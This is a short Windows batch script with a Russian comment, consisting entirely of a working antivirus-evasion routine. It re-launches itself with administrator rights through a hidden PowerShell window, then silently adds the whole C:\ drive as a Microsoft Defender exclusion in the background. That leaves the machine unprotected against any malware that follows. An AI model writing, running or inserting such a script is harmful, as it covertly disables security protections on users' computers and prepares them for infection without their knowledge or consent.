@echo off
:requestPrivileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process -WindowStyle Hidden -File '%~f0' -Verb runAs"
    exit /b
)

rem Выполняем команду в фоновом режиме
start /b powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
exit
